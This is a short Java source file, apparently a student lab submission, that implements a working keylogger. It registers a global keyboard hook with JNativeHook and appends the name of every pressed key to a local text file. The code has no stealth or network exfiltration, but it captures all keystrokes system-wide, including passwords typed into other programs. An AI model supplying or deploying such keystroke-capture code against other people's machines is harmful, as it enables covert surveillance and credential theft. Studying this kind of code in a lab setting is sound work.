import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;

/**
 * EC7020 - LAB5
 * Nayanajith Y.G.A.
 * 2018/E/083
 *
 */
public class Main implements NativeKeyListener {

    public static void main(String[] args) {
        try {
            File file = new File("output_file.txt");
            FileOutputStream fos = new FileOutputStream(file, true);
            System.setOut((new PrintStream(fos)));

        } catch (FileNotFoundException ex) {
            ex.printStackTrace();
        }
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Main());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent arg0) {
        //Print the pressed key name
        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }
}